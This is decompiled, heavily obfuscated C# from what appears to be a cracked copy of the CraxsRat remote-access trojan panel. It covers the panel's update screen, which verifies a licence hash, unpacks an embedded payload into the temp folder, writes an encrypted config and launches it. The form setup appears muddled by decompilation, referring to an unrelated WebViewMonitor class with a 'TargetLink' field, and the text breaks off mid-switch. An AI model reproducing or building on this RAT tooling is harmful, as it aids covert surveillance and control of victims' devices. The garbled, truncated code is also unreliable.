// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.UpdatesScreen
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class UpdatesScreen : Form
  {
    internal virtual Panel updatepanel
    {
      get => ((information) this)._updatepanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._updatepanel = value;
    }

    internal virtual TextBox logupdate
    {
      get => ((information) this)._logupdate;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._logupdate = value;
    }

    internal virtual Panel Panel1
    {
      get => ((information) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel1 = value;
    }

    internal virtual DrakeUIButtonIcon skipbtn
    {
      get => ((information) this)._skipbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Skipbtn_Click);
        DrakeUIButtonIcon skipbtn = ((information) this)._skipbtn;
        if (skipbtn == null)
          goto label_5;
label_1:
        int num1 = 1431773675;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~((444346369 ^ 677731897) - (-240418422 - 122529114) - --num2 * -564637859 ^ ~-1363277202)) % 6U)
          {
            case 0:
              skipbtn.Click += eventHandler;
              num1 = (int) num3 * 1675789221 ^ 1868805256;
              continue;
            case 1:
              int num4 = skipbtn == null ? -565900008 : (num4 = -1345690638);
              num1 = num4 ^ (int) num3 * -767689572;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_5;
            case 4:
              goto label_1;
            case 5:
              skipbtn.Click -= eventHandler;
              num1 = (int) num3 * 470211180 ^ 2130762339;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((information) this)._skipbtn = value;
        skipbtn = ((information) this)._skipbtn;
        num1 = 1893190393;
        goto label_2;
      }
    }

    internal virtual DrakeUIButtonIcon updatbtn
    {
      get => ((information) this)._updatbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Updatbtn_Click);
        DrakeUIButtonIcon updatbtn = ((information) this)._updatbtn;
label_1:
        int num1 = -614378777;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~num1 - (1899646473 * -376924713 - -2079298827 * 2003257223 * 1547523021))) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              updatbtn.Click += eventHandler;
              num1 = (int) num2 * 1979744489 ^ 1123240962;
              continue;
            case 2:
              goto label_1;
            case 3:
              ((information) this)._updatbtn = value;
              updatbtn = ((information) this)._updatbtn;
              int num3;
              num1 = num3 = updatbtn == null ? -60607917 : (num3 = -1410763808);
              continue;
            case 4:
              int num4 = updatbtn == null ? -774508610 : (num4 = -183880050);
              num1 = num4 ^ (int) num2 * -2130206871;
              continue;
            case 5:
              updatbtn.Click -= eventHandler;
              num1 = (int) num2 * -692393044 ^ 1027982266;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((information) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Panel2 = value;
    }

    internal virtual Label Label1
    {
      get => ((information) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((information) this)._Label1 = value;
    }

    public UpdatesScreen()
    {
label_1:
      int num1 = 2097498108;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(-(num1 ^ (--(188804899 - 1445024333) ^ -1843863368 ^ -983806383) - ((-1471132877 ^ -562475172 ^ -822056023) * 1724464689 ^ ~(1527850398 - 1058337370) - (1243976027 + 1674360418 + (-529317712 - 292157876)))) * 1298049499) - ~128293845) * 333918687)) % 4U)
        {
          case 0:
            this.CraxsStyle();
            num1 = (int) num2 * 1216122326 ^ -1288672401;
            continue;
          case 1:
            ((Updater) this).InitializeComponent();
            num1 = (int) num2 * 387576958 ^ -1653798997;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public void CraxsStyle()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = -670367887;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~-(-num1 + ((~(-473601429 * 355830403) ^ -~17172185) + ~(641692565 * ~383900699)))) % 8U)
        {
          case 0:
            this.updatbtn.Text = EXGuarder.\u0034567521C;
            this.skipbtn.Text = EXGuarder.\u003300B6E55;
            num1 = 221682387;
            continue;
          case 1:
            num1 = (int) num2 * 703648150 ^ -1766443195;
            continue;
          case 2:
            this.updatbtn.Text = EXGuarder.\u003165F5560;
            num1 = (int) num2 * -723883969 ^ 1416520715;
            continue;
          case 3:
            goto label_3;
          case 4:
            this.skipbtn.Text = EXGuarder.\u00370724A0F;
            num1 = (int) num2 * -1578749020 ^ 1634813540;
            continue;
          case 5:
            int num3 = Operators.CompareString(language, EXGuarder.\u003243F1725, false) == 0 ? -1954179502 : (num3 = -1450012948);
            num1 = num3 ^ (int) num2 * -2053901268;
            continue;
          case 6:
            int num4 = Operators.CompareString(language, EXGuarder.\u00363620A53, false) != 0 ? 1180171813 : (num4 = 106836820);
            num1 = num4 ^ (int) num2 * 886496917;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:;
    }

    private void Updatbtn_Click(object sender, EventArgs e)
    {
      try
      {
        string Left = Codes.CheckForUpdates2();
        if (Left == null)
          return;
        if (Operators.CompareString(Left, EXGuarder.\u003385A4C32, false) != 0)
        {
          try
          {
            if (Left.StartsWith(EXGuarder.\u003101B2D04))
              goto label_18;
label_3:
            int num1 = -583206312;
label_4:
            string str1;
            string text1;
            string text2;
            string str2;
            string[] strArray;
            string text3;
            while (true)
            {
              uint num2;
              switch ((num2 = (uint) (~(num1 * -1753474343 + --(~171617690 - (1818463986 - 219167411))) - 1187406469 + 1052654653 * -2128371051 ^ 2132577390)) % 14U)
              {
                case 1:
                  text1 = Codes.ReadConfig(EXGuarder.\u0033C6F3534);
                  text2 = Codes.ReadConfig(EXGuarder.\u0030A2D2C47);
                  int num3 = Operators.CompareString(str1, str2, false) != 0 ? 538125687 : (num3 = 1763269712);
                  num1 = num3 ^ (int) num2 * -651691417;
                  continue;
                case 2:
                  int num4;
                  num1 = num4 = !File.Exists(Path.GetTempPath() + EXGuarder.\u00312234346) ? 1199430968 : (num4 = -505584692);
                  continue;
                case 3:
                  goto label_18;
                case 4:
                  goto label_11;
                case 5:
                  File.Delete(Path.GetTempPath() + EXGuarder.\u00312234346);
                  num1 = (int) num2 * 1719638516 ^ 2058183316;
                  continue;
                case 6:
                  int num5 = !Directory.Exists(Path.GetTempPath() + EXGuarder.\u00347296E30) ? 360398903 : (num5 = -1213837075);
                  num1 = num5 ^ (int) num2 * -334651700;
                  continue;
                case 7:
                  Directory.CreateDirectory(Path.GetTempPath() + EXGuarder.\u00347296E30);
                  num1 = -1742994055;
                  continue;
                case 8:
                  Directory.Delete(Path.GetTempPath() + EXGuarder.\u00347296E30, true);
                  num1 = (int) num2 * 1342817182 ^ -1519283917;
                  continue;
                case 9:
                  goto label_8;
                case 10:
                  strArray = Left.Replace(EXGuarder.\u003101B2D04, EXGuarder.\u0032B195579).Split(':');
                  str2 = strArray[0];
                  num1 = (int) num2 * 1943600029 ^ 1659282908;
                  continue;
                case 11:
                  text3 = strArray[1];
                  num1 = (int) num2 * -861330205 ^ -261961903;
                  continue;
                case 12:
                  goto label_3;
                case 13:
                  if (Operators.CompareString(Codes.AES_Decrypt(str1, EXGuarder.\u00367576C41), Codes.hashmd5(Application.ExecutablePath), false) == 0)
                  {
                    num1 = 1773597151;
                    continue;
                  }
                  goto label_44;
                default:
                  goto label_19;
              }
            }
label_8:
            this.Close();
            return;
label_11:
            Codes.MyMsgBox(EXGuarder.\u00321281729, EXGuarder.\u00306592812, false, Craxs_Rat.My.Resources.Resources.sucess48px);
            return;
label_19:
            File.WriteAllBytes(Path.GetTempPath() + EXGuarder.\u00312234346, Craxs_Rat.My.Resources.Resources.up);
            try
            {
              Codes.File_zip_Decompress(Path.GetTempPath() + EXGuarder.\u00312234346, Path.GetTempPath() + EXGuarder.\u00347296E30);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
label_22:
              int num6 = -255588119;
              while (true)
              {
                uint num7;
                switch ((num7 = (uint) (~(num6 * -1753474343 + --(~171617690 - (1818463986 - 219167411))) - 1187406469 + 1052654653 * -2128371051 ^ 2132577390)) % 3U)
                {
                  case 1:
                    ProjectData.ClearProjectError();
                    num6 = (int) num7 * 1159291427 ^ -273672417;
                    continue;
                  case 2:
                    goto label_22;
                  default:
                    goto label_26;
                }
              }
            }
label_26:
            string str3 = Codes.WhatNewupdate2();
label_27:
            int num8 = -1967672019;
            string str4;
            string str5;
            string str6;
            string str7;
            string str8;
            Process process;
            string str9;
            string str10;
            string str11;
            while (true)
            {
              uint num9;
              switch ((num9 = (uint) (~(num8 * -1753474343 + --(~171617690 - (1818463986 - 219167411))) - 1187406469 + 1052654653 * -2128371051 ^ 2132577390)) % 12U)
              {
                case 0:
                  str4 = Codes.Encrypt(str2, EXGuarder.\u00375266359) + EXGuarder.\u003485A283E;
                  str5 = Codes.Encrypt(AppDomain.CurrentDomain.BaseDirectory, EXGuarder.\u0034A3B0F2A) + EXGuarder.\u003485A283E;
                  str6 = Codes.Encrypt(text1, EXGuarder.\u0035D374460) + EXGuarder.\u003485A283E;
                  num8 = (int) num9 * 1132604438 ^ -1776285001;
                  continue;
                case 1:
                  str3 = EXGuarder.\u0037549174D;
                  num8 = (int) num9 * 882132630 ^ -37844131;
                  continue;
                case 2:
                  process = new Process();
                  num8 = (int) num9 * -2107813541 ^ -1871336500;
                  continue;
                case 3:
                  str8 = Codes.Encrypt(Codes.AES_Decrypt(str1, EXGuarder.\u00367576C41), EXGuarder.\u0037543614B) + EXGuarder.\u003485A283E;
                  num8 = (int) num9 * -1421817730 ^ 614291293;
                  continue;
                case 4:
                  str10 = Codes.Encrypt(text3, EXGuarder.\u00314062A38) + EXGuarder.\u003485A283E;
                  str11 = Codes.Encrypt(text2, EXGuarder.\u0030E2A0846) + EXGuarder.\u003485A283E;
                  num8 = 1598448321;
                  continue;
                case 5:
                  string str12 = Codes.Encrypt(EXGuarder.\u0037552045C, EXGuarder.\u00333280C00) + EXGuarder.\u003485A283E;
                  string text4 = str10 + str11 + str7 + str8 + str4 + str5 + str6 + str9 + str12;
                  File.WriteAllText(Path.GetTempPath() + EXGuarder.\u003433C3748, Codes.Encrypt(text4, EXGuarder.\u00314062A38));
                  num8 = (int) num9 * 1486516488 ^ 1984531833;
                  continue;
                case 6:
                  str7 = Codes.Encrypt(str3, EXGuarder.\u00325305774) + EXGuarder.\u003485A283E;
                  num8 = (int) num9 * 1934625812 ^ -1444521544;
                  continue;
                case 7:
                  goto label_27;
                case 8:
                  str9 = Application.StartupPath + EXGuarder.\u003570C0348 + Codes.AES_Decrypt(EXGuarder.\u0031B6C5704, EXGuarder.\u003512C4E2C) + EXGuarder.\u003485A283E;
                  num8 = (int) num9 * 565528561 ^ 1403778022;
                  continue;
                case 9:
                  process.StartInfo.FileName = Path.GetTempPath() + EXGuarder.\u00310667067;
                  num8 = (int) num9 * -1152901967 ^ 1395359881;
                  continue;
                case 10:
                  int num10 = Operators.CompareString(str3, EXGuarder.\u0032D2E6B1E, false) != 0 ? -754363015 : (num10 = 1825950276);
                  num8 = num10 ^ (int) num9 * -954308713;
                  continue;
                default:
                  goto label_40;
              }
            }
label_40:
            process.StartInfo.WorkingDirectory = Path.GetTempPath() + EXGuarder.\u00347296E30;
            try
            {
              process.Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              Codes.MyMsgBox(EXGuarder.\u00308003A58, EXGuarder.\u003752A0038, false, Craxs_Rat.My.Resources.Resources.error48px);
              ProjectData.ClearProjectError();
              return;
            }
            Process.GetCurrentProcess().Kill();
            return;
label_44:
            Codes.MyMsgBox(EXGuarder.\u003403E7758, EXGuarder.\u00377244E2C, false, Craxs_Rat.My.Resources.Resources.error48px);
            return;
label_18:
            str1 = Codes.Encrypt(Codes.hashmd5(Application.ExecutablePath), EXGuarder.\u00367576C41);
            num1 = 1933820807;
            goto label_4;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Codes.MyMsgBox(EXGuarder.\u00365355F3D, EXGuarder.\u003752A0038, false, Craxs_Rat.My.Resources.Resources.error48px);
label_46:
            int num11 = -1303585665;
            while (true)
            {
              uint num12;
              switch ((num12 = (uint) (~(num11 * -1753474343 + --(~171617690 - (1818463986 - 219167411))) - 1187406469 + 1052654653 * -2128371051 ^ 2132577390)) % 3U)
              {
                case 0:
                  goto label_53;
                case 1:
                  ProjectData.ClearProjectError();
                  num11 = (int) num12 * 1873752480 ^ -1414652320;
                  continue;
                case 2:
                  goto label_46;
                default:
                  goto label_50;
              }
            }
label_53:
            return;
label_50:;
          }
        }
        else
        {
          Codes.MyMsgBox(EXGuarder.\u0033920655A, EXGuarder.\u003752A0038, false, Craxs_Rat.My.Resources.Resources.error48px);
label_52:
          uint num;
          switch ((num = (uint) (~(1404768320 * -1753474343 + --(~171617690 - (1818463986 - 219167411))) - 1187406469 + 1052654653 * -2128371051 ^ 2132577390)) % 3U)
          {
            case 2:
              goto label_52;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_55:
        int num13 = -838826563;
        while (true)
        {
          uint num14;
          switch ((num14 = (uint) (~(num13 * -1753474343 + --(~171617690 - (1818463986 - 219167411))) - 1187406469 + 1052654653 * -2128371051 ^ 2132577390)) % 3U)
          {
            case 0:
              goto label_55;
            case 1:
              ProjectData.ClearProjectError();
              num13 = (int) num14 * -503948188 ^ -1962996868;
              continue;
            case 2:
              goto label_58;
            default:
              goto label_59;
          }
        }
label_58:
        return;
label_59:;
      }
    }

    private void Skipbtn_Click(object sender, EventArgs e)
    {
      this.DialogResult = DialogResult.No;
      this.Close();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 1715396930;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (1017274244 - (num2 - (-(-74991339 * -818421519) - ~(142726401 + -1633552375) - (404755575 * (-767920775 + (381765585 + 209524950)) + ((-1466301265 * 1022983583 ^ ~-1425916080) + ~-1923712374))) + (~1569914946 + (~(66887206 ^ 1452992688) + (1547919279 + 641271558 + (414364212 - -755299264)))) - -(1995650998 + (1725745430 - 1345427457)) - --1752802713 * -1743721789) * 2052390703)) % 4U)
          {
            case 0:
              goto label_3;
            case 1:
              ((information) this).components.Dispose();
              num1 = (int) num3 * -1638009412 ^ 1820067404;
              continue;
            case 2:
              int num4 = ((information) this).components == null ? -830388732 : (num4 = 411865981);
              num1 = num4 ^ (int) num3 * 983333738;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((information) this).components = (IContainer) new System.ComponentModel.Container();
      ((WebViewMonitor) this).Panel1 = new Panel();
label_1:
      int num1 = -1335647161;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(-((--(1798954064 - (400929179 - 381128404)) - (num2 ^ (~(-1602741389 * (-1753514889 - 1962557241)) ^ --1191486750) + (~(1644032742 + 2132847177) - (718099013 - -1111680879 * 131554416) + (~(-1971334357 - -1596927084) - ~(81509938 + 1643156587))))) * -1585185773) - 279844349)) % 395U)
        {
          case 0:
            ((WebViewMonitor) this).Label3.TabIndex = 49;
            ((WebViewMonitor) this).Label3.Text = EXGuarder.\u0033C183D39;
            ((WebViewMonitor) this).Label3.TextAlign = ContentAlignment.MiddleRight;
            num1 = (int) num3 * 135225215 ^ 1172005590;
            continue;
          case 1:
            ((WebViewMonitor) this).statustext.Font = new Font(EXGuarder.\u00340753611, 9f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1209548126 ^ 106922558;
            continue;
          case 2:
            ((WebViewMonitor) this).clrbtn.Radius = 25;
            ((WebViewMonitor) this).clrbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -590206845 ^ -458009300;
            continue;
          case 3:
            ((WebViewMonitor) this).commndbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1519165112 ^ -2084368243;
            continue;
          case 4:
            ((WebViewMonitor) this).Panel5.BackColor = Color.Black;
            num1 = (int) num3 * 1883476585 ^ -563608599;
            continue;
          case 5:
            ((WebViewMonitor) this).linktext.Name = EXGuarder.\u0037258420F;
            num1 = (int) num3 * 1211013508 ^ -1904424150;
            continue;
          case 6:
            ((WebViewMonitor) this).TabPage3.BackColor = Color.Black;
            ((WebViewMonitor) this).TabPage3.Controls.Add((Control) ((WebViewMonitor) this).datapanel);
            num1 = (int) num3 * -853605747 ^ 994178421;
            continue;
          case 7:
            ((WebViewMonitor) this).DrakeUIComboBox1.Size = new Size(115, 27);
            num1 = (int) num3 * -599301625 ^ -1736834318;
            continue;
          case 8:
            ((WebViewMonitor) this).savbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1939579511 ^ 880331245;
            continue;
          case 9:
            ((WebViewMonitor) this).ClientPic.Dock = DockStyle.Left;
            num1 = (int) num3 * 26053414 ^ -119862057;
            continue;
          case 10:
            ((WebViewMonitor) this).TabPage1.Size = new Size(928, 453);
            num1 = (int) num3 * 635487714 ^ -1410779567;
            continue;
          case 11:
            ((WebViewMonitor) this).comandcombo.TabIndex = 48;
            ((WebViewMonitor) this).comandcombo.Text = EXGuarder.\u00306764E40;
            num1 = (int) num3 * 1359343822 ^ -670446203;
            continue;
          case 12:
            ((WebViewMonitor) this).cpybtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).cpybtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((WebViewMonitor) this).cpybtn.RectHoverColor = Color.White;
            num1 = (int) num3 * 867748754 ^ 1016647747;
            continue;
          case 13:
            ((WebViewMonitor) this).Panel3.Dock = DockStyle.Fill;
            num1 = (int) num3 * 959053066 ^ 360302082;
            continue;
          case 14:
            ((WebViewMonitor) this).Panel8.Controls.Add((Control) ((WebViewMonitor) this).namescombo);
            num1 = (int) num3 * -990854256 ^ 896593084;
            continue;
          case 15:
            ((WebViewMonitor) this).linkspanel.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 1477937301 ^ -498576259;
            continue;
          case 16:
            ((WebViewMonitor) this).openbtn.Size = new Size(99, 28);
            ((WebViewMonitor) this).openbtn.Style = UIStyle.Custom;
            ((WebViewMonitor) this).openbtn.Symbol = 57571;
            num1 = (int) num3 * 233845340 ^ 1403694191;
            continue;
          case 17:
            ((WebViewMonitor) this).Mytitle.Size = new Size(126, 28);
            ((WebViewMonitor) this).Mytitle.TabIndex = 20;
            ((WebViewMonitor) this).Mytitle.Text = EXGuarder.\u00340450717;
            num1 = (int) num3 * -967280868 ^ -179422105;
            continue;
          case 18:
            ((WebViewMonitor) this).savbtn.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((WebViewMonitor) this).savbtn.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1948360623 ^ 131226067;
            continue;
          case 19:
            ((WebViewMonitor) this).TabPage1 = new TabPage();
            num1 = (int) num3 * -1124366509 ^ 990165246;
            continue;
          case 20:
            ((WebViewMonitor) this).clrbtn.Symbol = 61741;
            ((WebViewMonitor) this).clrbtn.TabIndex = 23;
            ((WebViewMonitor) this).clrbtn.Text = EXGuarder.\u00306621778;
            num1 = (int) num3 * -1719734574 ^ -382264277;
            continue;
          case 21:
            ((WebViewMonitor) this).idtext.Watermark = EXGuarder.\u00347270930;
            ((WebViewMonitor) this).nametext.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 1257787409 ^ -324951819;
            continue;
          case 22:
            ((WebViewMonitor) this).SaveCheck.Margin = new Padding(2);
            num1 = (int) num3 * 1154672244 ^ 1777637440;
            continue;
          case 23:
            ((WebViewMonitor) this).DrakeUIComboBox1.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num3 * 632740552 ^ 639218121;
            continue;
          case 24:
            ((WebViewMonitor) this).Panel5.Controls.Add((Control) ((WebViewMonitor) this).ClientPic);
            ((WebViewMonitor) this).Panel5.Dock = DockStyle.Top;
            num1 = (int) num3 * -412056297 ^ -2122357906;
            continue;
          case 25:
            ((WebViewMonitor) this).cpybtn.FillColor = Color.Black;
            num1 = (int) num3 * 976019731 ^ -571218518;
            continue;
          case 26:
            ((WebViewMonitor) this).linkspanel.Name = EXGuarder.\u0034B743157;
            ((WebViewMonitor) this).linkspanel.Padding = new Padding(0, 26, 0, 0);
            ((WebViewMonitor) this).linkspanel.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 214473989 ^ 2039174950;
            continue;
          case 27:
            ((WebViewMonitor) this).tabcontrols.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 310017040 ^ -248501689;
            continue;
          case 28:
            ((WebViewMonitor) this).SaveCheck.Cursor = Cursors.Hand;
            ((WebViewMonitor) this).SaveCheck.Dock = DockStyle.Right;
            num1 = (int) num3 * 761449849 ^ -1881712889;
            continue;
          case 29:
            this.Name = EXGuarder.\u003460C0F64;
            num1 = (int) num3 * -1271864538 ^ -269933318;
            continue;
          case 30:
            ((WebViewMonitor) this).vewimage.TabStop = false;
            num1 = (int) num3 * 355438003 ^ 1369283581;
            continue;
          case 31:
            ((WebViewMonitor) this).Panel4.Location = new Point(0, 0);
            num1 = (int) num3 * 599826553 ^ -619844499;
            continue;
          case 32:
            ((WebViewMonitor) this).TabPage1.TabIndex = 0;
            num1 = (int) num3 * -1745568035 ^ -405010814;
            continue;
          case 33:
            ((WebViewMonitor) this).Mytitle = new Label();
            ((WebViewMonitor) this).DrakeUIComboBox1 = new DrakeUIComboBox();
            num1 = (int) num3 * -27052871 ^ -1766609038;
            continue;
          case 34:
            ((WebViewMonitor) this).DrakeUIComboBox1.Dock = DockStyle.Right;
            num1 = (int) num3 * 467569001 ^ 540531862;
            continue;
          case 35:
            ((WebViewMonitor) this).Panel8.Name = EXGuarder.\u003185E1974;
            num1 = (int) num3 * -1189590487 ^ -352248623;
            continue;
          case 36:
            ((WebViewMonitor) this).linktext.Cursor = Cursors.IBeam;
            ((WebViewMonitor) this).linktext.FillColor = Color.Black;
            num1 = (int) num3 * 840673499 ^ -87639408;
            continue;
          case 37:
            ((WebViewMonitor) this).refbtn.TabIndex = 20;
            num1 = (int) num3 * -1235881913 ^ 1984263980;
            continue;
          case 38:
            ((WebViewMonitor) this).linktext.Watermark = EXGuarder.\u0036005543C;
            ((WebViewMonitor) this).Panel9.Controls.Add((Control) ((WebViewMonitor) this).refbtn);
            ((WebViewMonitor) this).Panel9.Controls.Add((Control) ((WebViewMonitor) this).savbtn);
            ((WebViewMonitor) this).Panel9.Controls.Add((Control) ((WebViewMonitor) this).clrbtn);
            num1 = (int) num3 * -464265116 ^ 1738661986;
            continue;
          case 39:
            ((WebViewMonitor) this).TargetLink.TabIndex = 19;
            num1 = (int) num3 * 879676484 ^ -1082339734;
            continue;
          case 40:
            ((WebViewMonitor) this).selecthtmlbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 658286783 ^ 2095741228;
            continue;
          case 41:
            ((WebViewMonitor) this).openbtn.FillHoverColor = Color.FromArgb(20, 20, 20);
            ((WebViewMonitor) this).openbtn.FillPressColor = Color.Black;
            num1 = (int) num3 * 424230578 ^ 973621279;
            continue;
          case 42:
            ((WebViewMonitor) this).linktext.Margin = new Padding(4);
            ((WebViewMonitor) this).linktext.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * -1265332253 ^ -1835767943;
            continue;
          case 43:
            ((WebViewMonitor) this).commndbtn.Font = new Font(EXGuarder.\u00340753611, 12f);
            num1 = (int) num3 * 63623586 ^ 360536638;
            continue;
          case 44:
            ((WebViewMonitor) this).datapanel.Dock = DockStyle.Fill;
            num1 = (int) num3 * -1585023563 ^ 1431269083;
            continue;
          case 45:
            ((WebViewMonitor) this).Panel7.Controls.Add((Control) ((WebViewMonitor) this).SaveCheck);
            num1 = (int) num3 * -1477403971 ^ 445272437;
            continue;
          case 46:
            ((WebViewMonitor) this).TabPage1.Name = EXGuarder.\u003413B0109;
            num1 = (int) num3 * 78270760 ^ 731982212;
            continue;
          case 47:
            ((WebViewMonitor) this).openbtn.TabIndex = 18;
            ((WebViewMonitor) this).openbtn.Text = EXGuarder.\u003605E164F;
            num1 = (int) num3 * 673385000 ^ -737710470;
            continue;
          case 48:
            ((WebViewMonitor) this).commndbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * -1485276259 ^ -178927772;
            continue;
          case 49:
            ((WebViewMonitor) this).idtext.TabIndex = 46;
            num1 = (int) num3 * 1549515978 ^ 1444484776;
            continue;
          case 50:
            ((WebViewMonitor) this).tabcontrols.FillColor = Color.Black;
            num1 = (int) num3 * -112330113 ^ -1068248106;
            continue;
          case 51:
            ((WebViewMonitor) this).clrbtn.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1787039809 ^ 172028036;
            continue;
          case 52:
            ((WebViewMonitor) this).resulttext.Size = new Size(928, 398);
            ((WebViewMonitor) this).resulttext.TabIndex = 1;
            ((WebViewMonitor) this).resulttext.Text = EXGuarder.\u003310D096C;
            num1 = (int) num3 * -336829404 ^ 770697441;
            continue;
          case 53:
            ((WebViewMonitor) this).savbtn.RectHoverColor = Color.White;
            num1 = (int) num3 * -1302773089 ^ -362771029;
            continue;
          case 54:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            num1 = (int) num3 * -90359930 ^ -74407895;
            continue;
          case 55:
            ((WebViewMonitor) this).SaveCheck.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1754366012 ^ -413982725;
            continue;
          case 56:
            ((WebViewMonitor) this).TabPage3.Controls.Add((Control) ((WebViewMonitor) this).linkspanel);
            ((WebViewMonitor) this).TabPage3.Controls.Add((Control) ((WebViewMonitor) this).Panel8);
            num1 = (int) num3 * 421837190 ^ -629170905;
            continue;
          case 57:
            ((WebViewMonitor) this).vewimage.TabIndex = 3;
            num1 = (int) num3 * 800597864 ^ -445360318;
            continue;
          case 58:
            ((WebViewMonitor) this).Mytitle.Font = new Font(EXGuarder.\u00340753611, 14f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 657402791 ^ 303910124;
            continue;
          case 59:
            ((WebViewMonitor) this).TabPage3.Name = EXGuarder.\u003571A0973;
            num1 = (int) num3 * -812508679 ^ 1100382614;
            continue;
          case 60:
            ((ISupportInitialize) ((WebViewMonitor) this).ClientPic).BeginInit();
            num1 = (int) num3 * -778028319 ^ -291188897;
            continue;
          case 61:
            ((WebViewMonitor) this).namescombo.TextAlignment = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * 1080731951 ^ -1462786597;
            continue;
          case 62:
            ((WebViewMonitor) this).Panel9.SuspendLayout();
            num1 = (int) num3 * 367092643 ^ 1059182145;
            continue;
          case 63:
            ((WebViewMonitor) this).Panel8 = new Panel();
            num1 = (int) num3 * 1920556948 ^ 1101455369;
            continue;
          case 64:
            ((WebViewMonitor) this).clrbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 1494941075 ^ 537163033;
            continue;
          case 65:
            ((WebViewMonitor) this).statustext.Text = EXGuarder.\u00342040A51;
            num1 = (int) num3 * 1707817204 ^ 2108689826;
            continue;
          case 66:
            ((WebViewMonitor) this).datalogtext.Dock = DockStyle.Fill;
            ((WebViewMonitor) this).datalogtext.FillColor = Color.Black;
            num1 = (int) num3 * 1889082301 ^ -1988827881;
            continue;
          case 67:
            ((WebViewMonitor) this).DrakeUIComboBox1.ForeColor = Color.White;
            ((WebViewMonitor) this).DrakeUIComboBox1.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0033B3D1B1D,
              (object) EXGuarder.\u0034B484C46
            });
            num1 = (int) num3 * -1419588857 ^ 311229189;
            continue;
          case 68:
            ((WebViewMonitor) this).idtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1599507509 ^ 928265976;
            continue;
          case 69:
            ((WebViewMonitor) this).Panel8.Margin = new Padding(2);
            num1 = (int) num3 * 1432980854 ^ -1052167105;
            continue;
          case 70:
            goto label_1;
          case 71:
            ((ISupportInitialize) ((WebViewMonitor) this).vewimage).EndInit();
            ((WebViewMonitor) this).TabPage2.ResumeLayout(false);
            num1 = (int) num3 * 61362688 ^ -1093890945;
            continue;
          case 72:
            ((WebViewMonitor) this).tabcontrols = new DrakeUITabControl();
            num1 = (int) num3 * 1287702132 ^ -1779862476;
            continue;
          case 73:
